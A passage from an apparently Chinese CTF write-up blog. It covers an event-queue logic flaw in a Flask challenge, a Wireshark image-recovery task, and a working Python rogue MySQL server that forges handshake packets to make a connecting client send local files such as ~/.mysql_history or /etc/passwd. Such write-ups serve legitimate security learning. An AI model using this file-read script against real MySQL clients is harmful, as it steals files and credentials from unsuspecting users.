diamonds, &#123;&#125; points now.&lt;br /&gt;&#x27;</span>.<span class="built_in">format</span>(session[<span class="string">&#x27;num_items&#x27;</span>], session[<span class="string">&#x27;points&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;shop&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;reset&#x27;</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">        html += <span class="string">&#x27;Session reset.&lt;br /&gt;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    bool_show_source = <span class="built_in">str</span>(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = <span class="built_in">str</span>(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">        source = <span class="built_in">open</span>(<span class="string">&#x27;eventLoop.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">                html += line.replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>*<span class="number">4</span>).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&amp;nbsp;&#x27;</span>).replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;gt;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">            headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=serve.py&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    num_items = <span class="built_in">int</span>(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.<span class="built_in">format</span>(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">&#x27;num_items&#x27;</span>] += num_items </span><br><span class="line">    trigger_event([<span class="string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(num_items), <span class="string">&#x27;action:view;index&#x27;</span>])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    point_to_consume = <span class="built_in">int</span>(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;points&#x27;</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">&#x27;points&#x27;</span>] -= point_to_consume</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You naughty boy! ;) &lt;br /&gt;&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;num_items&#x27;</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        trigger_event(<span class="string">&#x27;func:show_flag;&#x27;</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">    trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>) </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://user-images.githubusercontent.com/40637063/56887796-12dafb80-6aa5-11e9-9181-aae6b45ea0ca.png" alt="Screenshot from 2019-04-29 17-29-27"></p>
+<p><img src="https://user-images.githubusercontent.com/40637063/56887798-140c2880-6aa5-11e9-8fcf-44b7353af4da.png" alt="Screenshot from 2019-04-29 17-28-05"></p>
+<p><img src="https://user-images.githubusercontent.com/40637063/56887802-14a4bf00-6aa5-11e9-853d-48cdb2ae8df4.png" alt="Screenshot from 2019-04-29 17-28-36"></p>
+<p>这里有个点有疑问：</p>
+<ul>
+<li>为什么<code>get_flag_handle</code>函数可以在没有参数的情况下运行？毕竟他申明的时候是有参数的。</li>
+</ul>
+<p>值得注意的是，<code>get_flag_handle</code> 和 <code>buy</code>函数是在<code>consume_point_function</code>执行之前被执行的，这个函数会检查我们是否有足够的钻石，如果没有就回滚。然而，整个流程是通过队列来控制的，这意味着如果我们将<code>buy</code>和<code>get_flag</code>函数插入在<code>consume_point_function</code>前面的话，他们会先执行并获取到<code>flag</code>， 注意到<code>trigger_event</code>会将flag放进<code>log</code>之中去并放在<code>session</code>中显示回来。</p>
+<h2 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h2><p><img src="https://user-images.githubusercontent.com/40637063/57570602-6d297400-7436-11e9-9cfe-720761c4b08f.png" alt="QQ截图20190511214737"></p>
+<p>客户端访问服务端时，服务端可以向客户端发送请求并且实现任意文件读取。</p>
+<p>题目中的脚本目的是检测是否开启了mysql服务，所以可以将回显的东西设置为 <code>result = [&#123;&#39;local_address&#39;:&quot;0.0.0.0:3306&quot;,&#39;Process_name&#39;:&quot;1234/mysqld&quot;&#125;]</code>，这样就可以绕过客户端的验证了。</p>
+<p>然后伪造一个mysql客户端。包括三部分：伪造greeting包，伪造登录成功包，伪造文件响应包。<br>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">port = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">server.bind((host,port))</span><br><span class="line"></span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># filename = &#x27;/etc/passwd&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;~/.mysql_history&#x27;</span></span><br><span class="line"></span><br><span class="line">greeting = <span class="string">&quot;5b0000000a352e372e32362d307562756e7475302e31392e30342e31000c0000001c2a785a183c1a6200fff7080200ff811500000000000000000000336b72452b23601d7c206856006d7973716c5f6e61746976655f70617373776f726400&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login_conf = <span class="string">&quot;0700000200000002000000&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的chr值得注意</span></span><br><span class="line">evil_request = <span class="built_in">chr</span>(<span class="built_in">len</span>(filename) + <span class="number">1</span>)+<span class="string">&quot;\x00\x00\x01\xfb&quot;</span>+filename</span><br><span class="line"></span><br><span class="line">conn, addr = server.accept()</span><br><span class="line">conn.send(greeting)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">9999</span>)</span><br><span class="line">conn.send(login_conf)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">9999</span>)</span><br><span class="line">conn.send(evil_request)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">9999</span>)</span><br></pre></td></tr></table></figure>
+
+<p>三个发送的东西分别对应如下：</p>
+<ul>
+<li>greeting</li>
+</ul>
+<p><img src="https://user-images.githubusercontent.com/40637063/57570552-ebd1e180-7435-11e9-9c95-fed585cdd3a2.png" alt="Screenshot from 2019-05-11 15-31-17"></p>
+<ul>
+<li><p>登录通过包</p>
+<p><img src="https://user-images.githubusercontent.com/40637063/57570520-7e25b580-7435-11e9-988e-f68b0f04317e.png" alt="Screenshot from 2019-05-11 15-35-00"></p>
+</li>
+<li><p>文件回显包</p>
+</li>
+</ul>
+<p><img src="https://user-images.githubusercontent.com/40637063/57570547-d8267b00-7435-11e9-9551-fb9ef384c7fd.png" alt="Screenshot from 2019-05-11 15-49-14"></p>
+<p>同时运行经过修改后的<code>agent.py</code>和我们的脚本，同时在题目中填上我们的ip和mysql的端口号，就得到了flag</p>
+<p><img src="https://user-images.githubusercontent.com/40637063/57570617-9944f500-7436-11e9-93c5-11b65904cd31.png" alt="Screenshot from 2019-05-11 16-30-14"></p>
+<p>参考 ：<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3277">https://xz.aliyun.com/t/3277</a></p>
+<p><a target="_blank" rel="noopener" href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/">http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/106488">https://www.anquanke.com/post/id/106488</a></p>
+<h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>拿到数据包，打开，设置过滤条件<code>http</code>，可以看到这里有图片流量。使用<code>file-&gt;export objects-&gt;http</code>来导出所有可以导出的东西，然后有两个通过16进制编辑器修改得出的图片和一张完整图片。其中，两张图片中有一张无法查看，另一张和完整的那张图片一模一样。或者也可以右击导出图中指定的图片部分数据。</p>
+<p><img src="https://user-images.githubusercontent.com/40637063/57571087-2474b980-743c-11e9-976a-480a59136d09.png" alt="Screenshot from 2019-05-11 22-18-49"></p>
+<p>在<code>wireshark</code>中追踪TCP流，发现最开始访问了一个图片加密的网站。</p>
+<p><img src="https://user-images.githubusercontent.com/40637063/57571086-23dc2300-743c-11e9-90fc-a068dc33cbfa.png" alt="Screenshot from 2019-05-11 22-22-25"></p>
+<p>进入，看起来图片的解密是需要密钥的，那么另一张无法查看的图片可能有我们想要的密钥。修改高宽之后可以查看密钥。进入解密网站解密，并用16进制解密即可。</p>
+<img width="799" alt="upload_repaire" src="https://user-images.githubusercontent.com/40637063/57571120-73225380-743c-11e9-8178-e1f74c83a67a.png">
+
+<p><img src="https://user-images.githubusercontent.com/40637063/57571078-f1322a80-743b-11e9-8ebe-099e2db550f7.png" alt="Screenshot from 2019-05-11 15-24-45"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/04/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="prev" title="流量分析">
+      <i class="fa fa-chevron-left"></i> 流量分析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/06/12/Google-Game/" rel="next" title="Google_Game">
+      Google_Game <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web-%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">web 签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E4%BB%8A%E6%99%9A%E5%90%83%E9%B8%A1"><span class="nav-number">2.</span> <span class="nav-text">大吉大利今晚吃鸡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BB%B4"><span class="nav-number">3.</span> <span class="nav-text">滴</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0"><span class="nav-number">4.</span> <span class="nav-text">图片上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#homebrew-event-loop"><span class="nav-number">5.</span> <span class="nav-text">homebrew event loop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">6.</span> <span class="nav-text">mysql弱口令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wireshark"><span class="nav-number">7.</span> <span class="nav-text">wireshark</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ch4ser"
+      src="/images/sabito.jpg">
+  <p class="site-author-name" itemprop="name">ch4ser</p>
+  <div class="site-description" itemprop="description">向阳十八载，回首也无晴</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ch4ser-go" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ch4ser-go" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ch4ser.go@gmail.com" title="E-Mail → mailto:ch4ser.go@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/darkch4ser" title="Telegram → https:&#x2F;&#x2F;t.me&#x2F;darkch4ser" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      My Lovely Friends
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://l0x1c.github.io/" title="https:&#x2F;&#x2F;l0x1c.github.io&#x2F;" rel="noopener" target="_blank">l0x1c</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://forever404.cn/" title="https:&#x2F;&#x2F;forever404.cn" rel="noopener" target="_blank">Forever</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://yml-sec.top/" title="https:&#x2F;&#x2F;yml-sec.top&#x2F;" rel="noopener" target="_blank">YeMoLi</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://althims.com/" title="https:&#x2F;&#x2F;althims.com" rel="noopener" target="_blank">Moyu</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://handsomedog.top/" title="http:&#x2F;&#x2F;handsomedog.top" rel="noopener" target="_blank">Handsomedog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://fightingtree.github.io/" title="http:&#x2F;&#x2F;fightingtree.github.io" rel="noopener" target="_blank">FightingTree</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://sunian19.github.io/" title="https:&#x2F;&#x2F;sunian19.github.io&#x2F;" rel="noopener" target="_blank">SuNian</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.cnxfs.com.cn/" title="https:&#x2F;&#x2F;blog.cnxfs.com.cn&#x2F;" rel="noopener" target="_blank">xiangfangsong</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ch4ser</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
